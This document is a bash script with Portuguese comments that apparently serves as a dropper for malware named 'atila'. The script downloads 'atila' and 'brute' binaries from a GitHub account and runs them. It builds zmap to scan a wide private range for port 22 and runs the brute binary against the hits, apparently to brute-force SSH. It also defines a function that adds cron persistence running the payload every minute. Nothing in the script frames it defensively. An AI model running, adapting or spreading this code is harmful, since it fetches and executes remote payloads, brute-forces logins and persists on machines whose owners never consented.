#ATILA_VKZMN

#esse script executara varias acoes   elas serao inplemetadas  

#nem todas agora ok so as mais importantes por agora ok

url='https://github.com/atilabyte/golang/raw/refs/heads/master/atila'
brute_url='https://github.com/atilabyte/golang/raw/refs/heads/master/brute'
url_zmap='https://github.com/zmap/zmap/archive/refs/tags/v4.4.0.zip'

wget_ok=0





brute(){


cd /var/tmp  ; cd .brute

wget $brute_url  -O brute || curl  -L $brute_url -o brute

chmod 777 brute && chmod 777 zmap

timeout   5s ./zmap  -p 22   192.168.1.1/10  > ips  #50 segundos para  pega os ips

timeout   5s    ./brute  #50 segundos para  testa o   ip

return

}




#################################
install_zmap(){


#function no critical

cd /var/tmp 

out_cat=$(cat .brute/zmap )

if (( ! $?  )) ; then 

echo zmap ja foi instalado


brute

return

fi ; 



if [ $EUID -eq  0 ] ; then


apt-get   update -y  &&  apt-get  upgrade  -y   

apt-get  install  -y  unzip  ; apt-get install -y make

apt-get install -y  gcc  || apt-get install -y cc

apt-get install -y  build-essential  ; apt-get install -y cmake

apt-get install -y   libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev libjudy-dev



cd /var/tmp 



wget $url_zmap  -O  zmap.zip  || curl  -L  $url_zmap  -o   zmap.zip #dowload zipedd   zmap


unzip  zmap.zip ; cd zmap-4.4.0  ;  cmake .  ;  make
 
mkdir -p  /var/tmp/.brute

cd src ; cp zmap /var/tmp/.brute/zmap




fi; #nao so root




}









cron() {

cron_out=$( crontab -l )
if  echo  "$cron_out" | grep -q atila  ; then 
echo tem
else
echo nao tem
#download of atila and add in crontab 
command -v wget
if (( $? )) ; then
wget_ok=0
else
wget_ok=1
fi;
if [ $wget_ok -eq 1 ] ; then
wget $url -O /var/tmp/atila
cd /var/tmp ; chmod 777 atila
(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -
else
curl  -L  $url -o /var/tmp/atila
cd /var/tmp ; chmod 777 atila
(crontab -l ; echo   "* * * * * /usr/bin/pgrep atila ||   /var/tmp/atila") | crontab -

fi;
fi;
}
##################









##################

init() {

 
while true ; do
install_zmap
done



#cron



}



init




